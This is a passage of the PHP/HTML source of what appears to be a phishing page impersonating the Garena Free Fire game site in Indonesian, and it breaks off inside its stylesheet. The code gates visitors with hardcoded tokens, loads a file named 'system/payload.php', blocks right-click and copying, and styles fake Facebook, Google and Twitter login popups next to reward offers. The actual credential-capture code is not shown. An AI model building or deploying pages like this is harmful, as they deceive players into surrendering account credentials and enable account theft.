<?php


if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<html lang="en"><head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
      <title>Garena Free Fire. Game genre Battle Royale mobile terbaik!</title>
      <meta name="robots" content="noindex, nofollow">
      <meta property="og:description" content="Free Fire adalah game mobile battle royale terbaik, diunduh lebih dari 1 milyar pemain di seluruh dunia, dikembangkan oleh Garena untuk Android dan iOS. Battle in Style dan jadi survivor yang bertahan">
      <meta property="og:image" content="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/navbar-logo.jpg">
      <meta property="og:image:width" content="540">
      <meta property="og:image:height" content="282">
      <link rel="stylesheet" href="css/facebook.css">
      <link rel="stylesheet" href="css/google.css">
      <link rel="stylesheet" href="css/animate.css">
      <link rel="stylesheet" href="css/style.css">
      <link rel="stylesheet" href="css/zero.css">
      <link href="https://fonts.googleapis.com/css2?family=Teko&display=swap" rel="stylesheet">
      <link href="css/font-awesome.min.css" rel="stylesheet" crossorigin="anonymous">
      <link rel="stylesheet" href="css/material-design-iconic-font.min.css">
      <link rel="stylesheet" href="css/all.min.css">
      <script src="fcode/runtime.min.js"></script>
      <link rel="icon" type="img/png" href="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/ff-logo-icon.png" sizes="32x32">
   </head>
   <body oncontextmenu="return false" onselectstart="return false" ondragstart="return false" style="display:none;">
      <style type="text/css">
         @charset "utf-8";
         @import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
         *,
         *:before,
         *:after {
         -webkit-box-sizing: border-box;
         -moz-box-sizing: border-box;
         box-sizing: border-box;
         }
         @font-face {
         font-family: 'laza';
         font-style: normal;
         font-weight: 700;
         src:
         url(fonts/laza.woff2) format("woff2"),
         url(fonts/laza.woff) format("woff"),
         url(fonts/laza.ttf) format("truetype");
         }
         @font-face {
         font-family: 'laza2';
         font-style: normal;
         font-weight: 700;
         src:
         url(fonts/laza2.ttf) format("truetype")
         }
         @font-face {
         font-family: 'laza3';
         font-style: normal;
         src:
         url(fonts/laza-latin.otf) format("opentype");
         }
         @font-face {
         font-family: 'laza4';
         font-style: normal;
         src:
         url(fonts/laza-extrabold.otf) format("opentype");
         }
         .laz-container {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/lazback.jpg) no-repeat center;
         background-size: 100% 100%;
         margin-top: 0px;
         padding: 5px;
         width: 100%;
         margin-left: 0px;
         margin-right: 0px;
         height: 480px;
         position: relative;
         }
         .gallery-container {
         background-size: 100% 100%;
         margin-top: -2px;
         width: 100%;
         height: auto;
         border: 0px solid #fff;
         float: left;
         }
         .container-box {
         background-size: 100% 100%;
         width: 100%;
         height: 690px;
         }
         #fgnloading-ff {
         position: fixed;
         top: 0;
         left: 0;
         width: 100%;
         height: 100%;
         background-color: #000;
         background-image: url('https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/loading.gif');
         background-size: contain;
         background-position: center;
         background-repeat: no-repeat;
         display: flex;
         justify-content: center;
         align-items: center;
         z-index: 9999;
         padding-top: calc(100% * 6 / 19);
         }
         #fgnloading-ff.hidden {
         opacity: 0;
         visibility: hidden;
         }
         .landing {
         background: url(landing.jpg) no-repeat center center;
         background-size: cover;
         width: 100%;
         height: auto;
         }
         .navbar {
         background: #0C0C0C;
         width: 100%;
         height: 44px;
         }
         .navbar-logo {
         width: 119px;
         float: left;
         margin-top: 7px;
         margin-left: 15px;
         }
         .navbar-shop {
         width: 25px;
         margin-top: 19px;
         margin-right: 20px;
         }
         .navbar-language {
         width: 30px;
         margin-top: 8px;
         margin-right: 17px;
         }
         .navbar-menu {
         width: 20px;
         margin-top: 19px;
         margin-right: 5px;
         }
         .navbar-right {
         width: auto;
         float: right;
         }
         .navbar-download {
         background: #ffca13;
         width: 46px;
         height: 45px;
         margin-top: 10px;
         margin-right: 10px;
         border-radius: 7px;
         float: right;
         }
         .navbar-download img {
         width: 20px;
         height: 21px;
         margin: 13px;
         }
         .header {
         width: 100%;
         height: auto;
         }
         .header img {
         width: 100%;
         height: auto;
         margin-top: -0px;
         }
         .balance2 {
         margin-left: auto;
         margin-right: auto;
         margin-bottom: 7px;
         padding: 5px;
         display: block;
         }
         .balance2 img {
         width: 100px;
         margin-top: -10px;
         margin-right: 5px;
         float: center;
         }
         .balance2-nom {
         color: #fff;
         font-size: 18px;
         padding-top: 8px;
         font-family: laza;
         font-weight: 500;
         text-align: left;
         text-shadow: 0 1px 0 #000;
         }
         .balance2-detail {
         width: auto;
         height: auto;
         padding-top: 2px;
         padding-left: 5px;
         padding-bottom: 0px;
         color: #fff;
         font-size: 15px;
         font-family: laza;
         text-align: center;
         text-shadow: 0 1px 0 #000;
         border-left: 3px solid #9FE9F7;
         line-height: 15px;
         float: left;
         }
         .balance2 button {
         background-size: 100% 100%;
         width: 30%;
         height: auto;
         margin-top: -75px;
         margin-right: 10px;
         padding: 5px;
         color: #000;
         font-size: 14px;
         font-family: laza;
         text-align: center;
         border: none;
         outline: none;
         position: relative;
         float: right;
         }
         .balance {
         background: url(lazabz.png) no-repeat center center;
         background-size: 100% 100%;
         width: 73%;
         height: 71px;
         margin-left: auto;
         margin-right: auto;
         margin-bottom: -9px;
         padding: 5px;
         border-top: 0px solid #70FFB2;
         border-left: 0px solid #70FFB2;
         border-right: 0px solid #70FFB2;
         border-bottom: 0px solid #70FFB2;
         display: block;
         }
         .balance img {
         width: 57px;
         border-top: 0px solid #1E90FF;
         border-left: 0px solid #1E90FF;
         border-right: 0px solid #1E90FF;
         border-bottom: 0px solid #1E90FF;
         margin-top: -1px;
         margin-right: 5px;
         float: left;
         }
         .balance-nom {
         color: #fff;
         font-size: 14px;
         padding-top: 13px;
         padding-bottom: 4px;
         font-family: laza;
         /* font-weight: 500; */
         text-align: left;
         /* text-shadow:0 1px 0 #000; */
         }
         .balance-detail {
         background: url(bg-det.png) no-repeat center center;
         background-size: 100% 100%;
         width: auto;
         height: auto;
         padding-top: 1px;
         padding-left: 5px;
         padding-right: 8px;
         padding-bottom: 3px;
         color: #fff;
         font-size: 13px;
         font-family: 'laza';
         text-align: center;
         text-shadow: 0 1px 0 #000;
         border-left: 3px solid #FAB203;
         line-height: 15px;
         float: left;
         }
         .balance-detail2 {
         background: url(bg-det2.png) no-repeat center center;
         background-size: 100% 100%;
         width: auto;
         height: auto;
         padding-top: 2px;
         padding-left: 5px;
         padding-right: 8px;
         padding-bottom: 3px;
         color: #fff;
         font-size: 14px;
         font-family: 'laza';
         text-align: center;
         text-shadow: 0 1px 0 #000;
         border-left: 3px solid #b70303;
         line-height: 15px;
         float: left;
         }
         .balance-detail3 {
         background: url(bg-det3.png) no-repeat center center;
         background-size: 100% 100%;
         width: auto;
         height: auto;
         padding-top: 2px;
         padding-left: 5px;
         padding-right: 8px;
         padding-bottom: 3px;
         color: #fff;
         font-size: 14px;
         font-family: laza;
         text-align: center;
         text-shadow: 0 1px 0 #000;
         border-left: 3px solid #a30889eb;
         line-height: 15px;
         float: left;
         }
         .balance button {
         background: url(lazbutton.png) no-repeat center center;
         background-size: 100% 100%;
         width: 30%;
         height: 33px;
         margin-top: -14px;
         margin-right: 0px;
         padding: 5px;
         padding-right: 21px;
         color: #000000;
         font-size: 17px;
         font-family: 'laza';
         font-weight: 500;
         text-align: right;
         text-shadow: 0 3px 0 #ffffff;
         border: none;
         outline: none;
         position: relative;
         float: right;
         animation: pulse .900s infinite alternate;
         animation-play-state: running;
         }
         .header video {
         width: 100%;
         border: none;
         }
         .slideshow-container {
         max-width: 1000px;
         position: relative;
         margin: auto;
         border-top: 1px solid #ECD954;
         border-bottom: 1px solid #ECD954;
         }
         .fade {
         -webkit-animation-name: fade;
         -webkit-animation-duration: 1.5s;
         animation-name: fade;
         animation-duration: 1.5s;
         }
         .notiftwitter {
         width: 30%;
         height: 30px;
         margin-left: 35%;
         margin-right: auto;
         padding: 5px;
         font-size: 22px;
         font-family: Teko;
         font-weight: 500;
         text-align: center;
         color: #ECD954;
         margin-bottom: 0px;
         border: none;
         position: relative;
         outline: none;
         display: block;
         }
         .season-logo {
         width: 20%;
         margin: 15px;
         float: left;
         }
         .season-logos {
         width: 40%;
         margin: 5px;
         float: right;
         }
         .season-slogan {
         width: 100%;
         margin-top: 100%;
         margin-left: auto;
         margin-right: auto;
         display: block;
         }
         .season-btn {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/yes_laza.png) no-repeat center;
         background-size: 100% 100%;
         width: auto;
         height: auto;
         margin-left: auto;
         margin-right: auto;
         padding: 10px;
         padding-left: 30px;
         padding-right: 30px;
         font-size: 18px;
         font-family: laza;
         font-weight: 500;
         text-align: center;
         color: #000;
         margin-bottom: 3px;
         border: none;
         position: relative;
         outline: none;
         display: block;
         }
         .season-btn:hover {
         background: url(menu_on.png) no-repeat center;
         background-size: 100% 100%;
         color: #000;
         transition: 0.5s;
         }
         .subject-event {
         font-style: oblique;
         margin-top: -60px;
         margin-left: 42px;
         color: #ffffff;
         text-shadow: 3px 3px 3px #000000;
         font-family: 'laza4';
         font-size: 20px;
         position: absolute;
         }
         .event-title {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/slogan2.png) no-repeat center center;
         background-size: 100% 100%;
         width: 100%;
         height: 6px;
         margin-top: -6px;
         margin-left: -5px;
         display: block;
         position: absolute;
         }
         .event-title2 {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/slogan2.png) no-repeat center center;
         background-size: 100% 100%;
         width: 100%;
         height: 6px;
         margin-top: 470px;
         margin-left: -5px;
         display: block;
         position: absolute;
         }
         .event-notification {
         background-size: auto;
         background-size: 94% 100%;
         width: 85%;
         height: 48px;
         margin-left: auto;
         margin-right: auto;
         margin-top: -2px;
         margin-bottom: -82px;
         display: block;
         }
         .event-notification-text {
         padding-top: 10px;
         padding-left: 59px;
         color: #dbff85;
         font-size: 16px;
         font-family: Teko;
         font-weight: 550;
         text-align: left;
         float: left;
         }
         .event-notification-timer {
         padding-top: 44px;
         padding-right: 28px;
         color: #dbff85;
         font-size: 27px;
         font-family: Teko;
         font-weight: 550;
         text-align: left;
         margin-bottom: 13px;
         float: right;
         }
         .alert-wrapper {
         width: 98%;
         height: auto;
         border: none;
         margin-left: 10px;
         display: block;
         margin: 10px auto;
         margin-top: -31px;
         margin-bottom: -17px;
         }
         .alert {
         background-size: auto;
         background-size: 100% 100%;
         width: 91%;
         height: 62px;
         margin-top: 29px;
         margin-bottom: 18px;
         padding: 14px;
         margin-left: 5px;
         margin-right: 100px;
         color: #fff;
         border: none;
         }
         .alert2 {
         background-size: auto;
         background-size: 78% 80%;
         width: 91%;
         height: 62px;
         margin-top: 29px;
         margin-bottom: 18px;
         padding: 14px;
         margin-left: 16px;
         margin-right: 100px;
         color: #fff;
         border: none;
         }
         .alert-text {
         margin-top: -330px;
         margin-left: -6px;
         padding: 7px;
         color: #ffffff;
         text-align: center;
         font-size: 14px;
         font-family: laza;
         border: none;
         }
         .alert-text-mid {
         margin-top: 1px;
         padding: 7px;
         color: #f1f1f0;
         text-align: center;
         font: 25px;
         font-family: laza;
         border: none;
         margin-right: -2px;
         font-size: 19px;
         }
         .loadkin {
         width: 100%;
         height: 100%;
         position: fixed;
         top: 0;
         left: 0;
         z-index: 9999;
         background: #000;
         }
         .loadkin-box {
         position: relative;
         margin: 50px auto;
         text-align: center;
         height: 43px;
         font-size: 20px;
         padding: 5px;
         padding-bottom: 5px;
         margin-top: 70%;
         }
         .loadkin-box img {
         width: 70px;
         height: 85px;
         margin-bottom: 10px;
         }
         .loadkin-box i {
         padding-top: 15px;
         padding-bottom: 15px;
         color: #fff;
         font-size: 20px;
         float: center;
         font-family: arial, sans-serif;
         text-align: center;
         }
         .popup {
         width: 100%;
         height: 100%;
         position: fixed;
         top: 0;
         left: 0;
         z-index: 9999;
         background-color: rgba(0, 0, 0, 0.4);
         }
         .popup-box-wrapper {
         width: auto;
         height: auto;
         position: relative;
         margin: 50px auto;
         margin-top: 15%;
         text-align: center;
         font-family: 'laza';
         color: #fff;
         }
         .popup-box-wrapperz {
         width: 390px;
         height: auto;
         position: relative;
         margin: 50px auto;
         margin-top: 15%;
         text-align: center;
         font-family: 'laza';
         color: #fff;
         }
         .popup-box-navbar {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/popup-navbar2.png) no-repeat center center;
         background-size: 100% 100%;
         height: 43px;
         padding-bottom: 5px;
         }
         .popup-box-navbar img {
         width: 25px;
         height: 25px;
         margin-top: 7px;
         margin-right: 15px;
         float: right;
         }
         .popup-box-navbar-title {
         padding-top: 7px;
         padding-bottom: 2px;
         padding-left: 14px;
         font-size: 18px;
         font-family: 'laza3';
         font-weight: 900;
         text-align: left;
         color: #000000;
         }
         .popup-box-navbarz {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/popup-navbar2.png) no-repeat center center;
         background-size: 100% 100%;
         height: 43px;
         padding-bottom: 5px;
         }
         .popup-box-navbarz img {
         width: 25px;
         height: 25px;
         margin-top: 7px;
         margin-right: 15px;
         float: right;
         }
         .popup-box-navbarz-title {
         padding-top: 9px;
         padding-bottom: 2px;
         font-size: 20px;
         font-family: laza;
         font-weight: 300;
         text-align: center;
         color: #fff;
         }
         .popup-box-navbar-lz {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/popup-navbar3.png) no-repeat center center;
         background-size: 100% 100%;
         height: 43px;
         padding-bottom: 5px;
         }
         .popup-box-navbar-lz img {
         width: 20px;
         height: auto;
         margin-top: 7px;
         margin-right: 15px;
         float: right;
         }
         .popup-box-navbar-lz-title {
         padding-top: 7px;
         padding-bottom: 2px;
         padding-left: 14px;
         font-size: 18px;
         font-family: 'laza3';
         font-weight: 900;
         text-align: left;
         color: #000000;
         }
         .popup-box-bg {
         background: url(popup-box-bg2.png) no-repeat center center;
         background-size: 100% 100%;
         width: 400px;
         }
         .popup-box-bgz {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/popup-box-bg3.png) no-repeat center center;
         background-size: 100% 100%;
         width: 100%;
         margin-top: -12px;
         margin-left: 0px;
         }
         .popup-box-lz {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/popup-box-bg3.png) no-repeat center center;
         background-size: 100% 100%;
         width: 100%;
         margin-top: -12px;
         margin-left: 0px;
         }
         .popup-box-bgx {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/popup-box-bg3.png) no-repeat center center;
         background-size: 100% 100%;
         width: 100%;
         margin-top: 0px;
         margin-left: 0px;
         font-size: 18px;
         padding-bottom: auto;
         padding-top: 30px;
         }
         .loginpop {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/lazlogin.png) no-repeat center center;
         background-size: contain;
         width: 400px;
         height: 200px;
         margin: 50px auto;
         text-align: center;
         margin-top: 300px;
         }
         .popup-box-gamecon {
         width: 52%;
         height: 65px;
         margin-left: auto;
         margin-right: auto;
         margin-top: 12px;
         display: block;
         }
         .popup-box-alert {
         width: 95%;
         height: auto;
         margin-top: 10px;
         margin-left: auto;
         margin-right: auto;
         margin-bottom: 10px;
         padding: 5px;
         color: #AAAAAA;
         font-size: 18px;
         font-family: laza;
         font-weight: 500;
         text-align: left;
         display: block;
         }
         .popup-box-alert2 {
         width: 95%;
         height: auto;
         margin-top: 10px;
         margin-left: auto;
         margin-right: auto;
         margin-bottom: 10px;
         padding: 5px;
         color: #AAAAAA;
         font-size: 18px;
         font-family: laza;
         font-weight: 500;
         text-align: left;
         display: block;
         }
         .popup-box-alert0 {
         width: 95%;
         height: auto;
         margin-top: 10px;
         margin-left: auto;
         margin-right: auto;
         margin-bottom: 10px;
         padding: 5px;
         color: #AAAAAA;
         font-size: 18px;
         font-family: laza;
         font-weight: 500;
         text-align: right;
         display: block;
         }
         .popup-box-alert3 {
         width: 95%;
         height: auto;
         margin-top: 10px;
         margin-left: auto;
         margin-right: auto;
         margin-bottom: 10px;
         padding: 5px;
         color: #c7c7c7;
         font-size: 15px;
         font-family: laza3;
         font-weight: 500;
         text-align: center;
         /* font-style: italic; */
         display: block;
         }
         .popup-box-alert7 {
         width: 95%;
         height: auto;
         margin-top: 10px;
         margin-left: auto;
         margin-right: auto;
         margin-bottom: 10px;
         padding: 5px;
         color: #F5EAB0;
         font-size: 18px;
         font-family: laza3;
         font-weight: 500;
         text-align: center;
         display: block;
         }
         .popup-box-alertsz {
         width: 95%;
         height: auto;
         margin-top: 26px;
         margin-left: auto;
         margin-right: auto;
         margin-bottom: -94px;
         padding: 55px;
         color: #fdffff;
         font-size: 18px;
         font-family: laza3;
         font-weight: 500;
         text-align: center;
         display: block;
         }
         .popup-box-alert-lz {
         width: 95%;
         height: auto;
         margin-top: 10px;
         margin-left: auto;
         margin-right: auto;
         margin-bottom: 2px;
         padding: 18px;
         color: #cdcdcd;
         font-size: 14px;
         font-family: 'laza3';
         font-weight: 500;
         text-align: center;
         display: block;
         }
         .popup-box-alert4 {
         width: 95%;
         height: auto;
         margin-top: 2px;
         margin-left: auto;
         margin-right: auto;
         margin-bottom: 2px;
         padding: 12px;
         color: #e6ac1b;
         font-size: 16px;
         font-family: laza3;
         font-weight: 500;
         text-align: center;
         display: block;
         }
         .popup-box-alert4 i {
         padding-top: 15px;
         padding-bottom: 15px;
         color: #AAAAAA;
         font-size: 50px;
         text-align: center;
         }
         .popup-box-alert-login {
         width: 95%;
         height: auto;
         margin-top: 2px;
         margin-left: auto;
         margin-right: auto;
         margin-bottom: -5px;
         padding: 12px;
         color: #e6ac1b;
         font-size: 16px;
         font-family: laza3;
         font-weight: 500;
         text-align: center;
         display: block;
         }
         .popup-box-alert-login i {
         padding-top: 15px;
         padding-bottom: 15px;
         color: #AAAAAA;
         font-size: 50px;
         text-align: center;
         }
         .line {
         width: 235%;
         height: auto;
         margin-left: 87px;
         margin-top: -85px;
         padding-top: 25px;
         padding-bottom: 20px;
         border-bottom: 1px solid #ffffff9e;
         display: block;
         }
         .popup-box-item {
         width: 16%;
         height: 67px;
         margin-top: 38px;
         margin-left: auto;
         margin-right: auto;
         text-align: right;
         display: block;
         }
         .popup-box-item img {
         width: 100%;
         height: 100%;
         }
         .popup-box-item span {
         background-size: 56% 100%;
         width: auto;
         color: #fff;
         font-size: 13px;
         font-family: laza3;
         text-align: right;
         position: absolute;
         top: 57px;
         right: 4px;
         }
         .popup-box-item rw {
         background-size: 56% 100%;
         width: 229%;
         color: #f5ecd4;
         font-size: 13px;
         font-family: laza3;
         float: right;
         text-align: left;
         position: absolute;
         top: 18px;
         right: -197px;
         }
         .popup-box-item pr {
         background-size: 56% 100%;
         width: 229%;
         color: #c9c9c9;
         font-size: 13px;
         font-family: laza3;
         float: right;
         text-align: left;
         position: absolute;
         top: 41px;
         right: -256px;
         }
         .popup-box-item prs {
         background-size: 56% 100%;
         width: 229%;
         color: #fd2121;
         font-size: 13px;
         font-family: laza3;
         float: right;
         text-align: left;
         position: absolute;
         top: 41px;
         right: -256px;
         text-decoration: line-through;
         }
         .popup-box-alert-price {
         background-size: 56% 100%;
         width: auto;
         color: #fff;
         font-size: 13px;
         font-family: laza3;
         float: right;
         position: absolute;
         top: 41px;
         right: -46px;
         }
         .popup-box-form {
         width: 85%;
         height: auto;
         margin-left: auto;
         margin-right: auto;
         display: block;
         }
         .popup-box-form label {
         display: inline-block;
         width: 140px;
         text-align: right;
         color: yellow;
         }
         .popup-box-form input {
         background: #1a1b1c;
         background-size: 100% 100%;
         width: 100%;
         height: 35px;
         margin-bottom: 3px;
         padding: 4px;
         padding-left: 10px;
         color: #c3c3c3;
         font-size: 16px;
         font-family: laza3;
         font-weight: 300;
         border: 1px solid #8f8f8f;
         position: relative;
         outline: none;
         -webkit-appearance: none;
         -moz-appearance: none;
         }
         .popup-box-form input::placeholder {
         color: #FFFBF7;
         }
         .popup-box-form select {
         background: #1a1b1c;
         background-size: 100% 100%;
         width: 100%;
         height: 35px;
         margin-bottom: 3px;
         padding: 4px;
         padding-left: 10px;
         color: #c3c3c3;
         font-size: 16px;
         font-family: laza3;
         font-weight: 300;
         border: 1px solid #8f8f8f;
         position: relative;
         outline: none;
         -webkit-appearance: none;
         -moz-appearance: none;
         }
         .popup-box-footer {
         background-size: 100% 100%;
         margin-top: 20px;
         width: 100%;
         height: 45px;
         }
         .popup-box-footer-lz {
         background-size: 100% 100%;
         margin-top: 29px;
         width: 100%;
         height: 45px;
         }
         .popup-box-footer-lz button {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/yes_laza.png) no-repeat center;
         background-size: 100% 100%;
         width: auto;
         height: auto;
         margin-top: -23px;
         padding: 0px;
         padding-left: 35px;
         padding-right: 35px;
         color: #120f0f;
         font-size: 16px;
         font-family: 'laza3';
         font-weight: 700;
         margin-left: auto;
         margin-right: auto;
         text-align: center;
         border: none;
         outline: none;
         }
         .popup-box-footer button {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/yes_laza.png) no-repeat center;
         background-size: 100% 100%;
         width: auto;
         height: auto;
         margin-top: -23px;
         padding: 5px;
         padding-left: 35px;
         padding-right: 35px;
         color: #000;
         font-size: 18px;
         font-family: laza;
         font-weight: 500;
         margin-left: auto;
         margin-right: auto;
         text-align: center;
         border: none;
         outline: none;
         }
         .popup-box-form-footer {
         background-size: 100% 100%;
         width: 100%;
         height: 45px;
         margin-top: 20px;
         }
         .popup-box-form-footer button {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/yes_laza.png) no-repeat center;
         background-size: 100% 100%;
         width: auto;
         height: auto;
         margin-top: 5px;
         padding: 4px;
         padding-left: 30px;
         padding-right: 30px;
         color: #000;
         font-size: 18px;
         font-family: laza3;
         font-weight: 700;
         text-align: center;
         border: none;
         outline: none;
         }
         .popup-box-navbar-login {
         background: url(popup-navbar1.png) center center/100% 100% no-repeat;
         height: auto;
         padding-top: 5px;
         padding-bottom: 1px
         }
         .popup-box-navbar-login-title {
         padding-left: 24px;
         padding-top: 2px;
         color: #defbff;
         font-size: 22px;
         font-family: laza;
         font-weight: 500;
         text-align: center
         }
         .popup-box-bg-login {
         background: url(popup-box-bg-login.png) center center/100% 100% no-repeat;
         width: 100%;
         height: 255px;
         margin-top: -10px
         }
         .popup-box-bg-login-load {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/lazlogin.png) no-repeat center center;
         background-size: 100% 100%;
         margin-left: -20px;
         width: 400px;
         height: 200px;
         margin-top: -10px;
         }
         .load-login-img {
         width: 30%;
         height: auto;
         margin-top: 30px;
         margin-bottom: 5px
         }
         .load-login-gif {
         width: 15%;
         height: auto;
         margin-bottom: 0
         }
         .popup-btn-login {
         width: 35%;
         height: 27px;
         padding-top: 4px;
         padding-left: 8px;
         margin-bottom: 10px;
         margin: 5px;
         color: #000;
         font-size: 9.5px;
         font-family: 'laza3';
         border: none;
         border-top-left-radius: 3px;
         border-top-right-radius: 3px;
         border-bottom-right-radius: 3px;
         border-bottom-left-radius: 3px;
         outline: none;
         margin-bottom: 45px;
         position: relative;
         }
         .popup-btn-login i {
         color: #fff;
         font-size: 14px;
         float: left;
         }
         .popup-btn-facebook {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/fb.png);
         background-size: 100% 100%;
         color: #fff;
         margin-bottom: 41px;
         }
         .popup-btn-twitter {
         background: #ffffff;
         margin-bottom: 3px;
         color: #0d0c0c;
         }
         .popup-btn-google {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/google.png);
         background-size: 100% 100%;
         color: #000000;
         margin-bottom: 45px;
         }
         .popup-btn-login img {
         width: 14px;
         margin-top: 0px;
         float: left;
         }
         .popup-btn-login-link {
         background: #E3B448;
         color: #000;
         }
         .popup-btn-login-link img {
         width: 22px;
         height: 22px;
         margin-top: -2px;
         color: #fff;
         font-size: 20px;
         float: left;
         }
         .popup-login {
         background: rgba(0, 0, 0, 0.4);
         width: 100%;
         height: 100%;
         position: fixed;
         top: 0;
         left: 0;
         z-index: 9999;
         }
         .popup-box-login-fb {
         background: #ECEFF6;
         max-width: 330px;
         height: auto;
         position: relative;
         margin: 50px auto;
         margin-top: 1.9%;
         text-align: center;
         font-family: 'Teko';
         color: #000;
         border-radius: 10px;
         }
         .popup-box-login-twitter {
         background: #fff;
         max-width: 330px;
         height: auto;
         position: relative;
         margin: 50px auto;
         margin-top: 10%;
         text-align: center;
         font-family: 'Teko';
         color: #000;
         border-radius: 5px;
         }
         .popup-box-login-google {
         background:#fff;
         max-width:330px;
         height:auto;
         position:relative;
         margin:50px auto;
         margin-top:36%;
         text-align:center;
         font-family: 'Open Sans', sans-serif;
         color:#000;
         border-radius:5px;
         }
         .close-fb {
         background: #3b5998;
         width: 25px;
         height: 25px;
         color: #fff;
         font-size: 20px;
         text-align: center;
         text-decoration: none;
         border-radius: 50%;
         top: -10px;
         right: -10px;
         position: absolute;
         display: block;
         }
         .close-fb i {
         padding-top: 3px;
         }
         .close-other {
         background: #fff;
         width: 25px;
         height: 25px;
         color: #000;
         font-size: 20px;
         text-align: center;
         border-radius: 50%;
         top: -12px;
         right: -12px;
         position: absolute;
         z-index: 9999999;
         display: block;
         }
         .close-other i {
         color: #20px;
         padding-top: 3px;
         }
         .popups {
         width: 100%;
         height: 100%;
         position: fixed;
         top: 0;
         left: 0;
         z-index: 9999;
         background-color: rgba(0, 0, 0, 0.4);
         }
         .popup-box-wrappers {
         width: 390px;
         height: auto;
         position: relative;
         margin: 50px auto;
         margin-top: 15%;
         text-align: left;
         font-family: 'laza';
         color: #fff;
         }
         .popup-box-navbars {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/popup-navbar2.png) no-repeat center center;
         background-size: 100% 100%;
         height: 43px;
         padding-bottom: 5px;
         }
         .popup-box-navbars img {
         width: 20px;
         height: 20px;
         margin-top: 15px;
         margin-right: 18px;
         float: right;
         }
         .popup-box-navbars-title {
         padding-left: 40px;
         padding-top: 14px;
         padding-bottom: 2px;
         font-size: 20px;
         color: #fff;
         font-family: laza;
         font-weight: 300;
         text-align: center;
         }
         .kagetk {
         background: rgba(0, 0, 0, 0.2);
         background-size: 50% 50%;
         width: 80%;
         height: auto;
         margin-left: auto;
         margin-right: auto;
         border: 1px solid #fff;
         display: none;
         padding: 10px;
         color: #fff;
         font-size: 14px;
         font-family: laza;
         text-align: center;
         }
         .popup-box-bgs {
         background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images/popup-box-bg3.png) no-repeat center center;
         background-size: 100% 100%;
         width: 100%;
         height: 200px;
         margin-top: -12px;
         }
         .popup-box-alerts4 {
         width: 95%;
         height: auto;
         margin-top: 10px;
         margin-left: auto;
         margin-right: auto;
         margin-bottom: 10px;
         padding: 5px;
         color: #fff;
         font-size: 20px;
         font-family: laza;
         font-weight: 500;
         text-align: left;
         display: block;
         }
         .popup-box-alerts4 i {
         padding-top: 15px;
         padding-bottom: 15px;
         color: #F5EAB0;
         font-size: 50px;
         text-align: left;
         }
         .popup-box-formx label {
         width: 70%;
         text-align: left;
         padding-left: 20px;
         color: #B7B7B7;
         text-shadow: none;
         font-size: 17px;
         }
         .popup-box-formx input {
         background: #001;
         width: 85%;
         height: 35px;
         margin-bottom: 8px;
         margin-left: 20px;
         padding-right: 4px;
         padding: 4px;
         color: #fff;
         font-size: 15px;
         font-family: laza;
         font-weight: 500;
         border: 0.1px solid #fff;
         outline: none;
         position: left;
         -webkit-appearance: none;
         -moz-appearance: none;
         }
         .popup-box-formx input::placeholder {
         color: #BCCBCE;
         }
         .popup-box-formx-footer {
         background-size: 100% 100%;
         width: 100%;
         height: 45px;
         margin-top: 20px;
         }
         .loadinglogin {
         width: 100%;
         height: auto;
         }
         .loadinglogin video {
         width: 400px;
         height: auto;
         }
         .box {
         width: 100%;
         height: 410px;
         margin-left: auto;
         margin-right: auto;
         margin-top: -30px;
         margin-bottom: -25px;
         border: 0px solid #FFFAC9;
         border-radius: 5px;
         position: relative;
         display: block;
         }
         .box-item {
         width: 100%;
         margin-left: auto;
         margin-right: auto;
         padding-top: 2px;
         }
         .btn-wrapper {
         width: 93%;
         height: 50px;
         margin-top: 3px;
         margin-right: 3px;
         font-family: laza;
         }
         .btn-wrapper button {
         background: url(tombol.png) no-repeat center;
         background-size: 100% 100%;
         width: 38%;
         height: 40px;
         margin: -10px;
         padding: 10px;
         color: #FFFAC9;
         font-family: laza;
         font-size: 18px;
         font-weight: 500;
         text-align: center;
         border: none;
         outline: none;
         float: right;
         display: inline-block;
         }
         .footer {
         background: -webkit-linear-gradient(top, rgb(255 255 255 / 9%) 0%, rgb(0 0 0 / 11%) 100%);
         width: 100%;
         height: auto;
         padding: 15px;
         padding-top: 0px;
         padding-bottom: 25px;
         border-top: 1px solid #EF0133;
         }
         .footer-copyright-icon {
         width: 33%;
         padding-top: 27px;
         margin-left: auto;
         margin-right: auto;
         display: block;
         }
         .footer-copyright-text {	
         padding:5px;
         padding-top: 25px;
         margin-left: auto;
         margin-right: auto;	
         float: center;
         text-align: center;
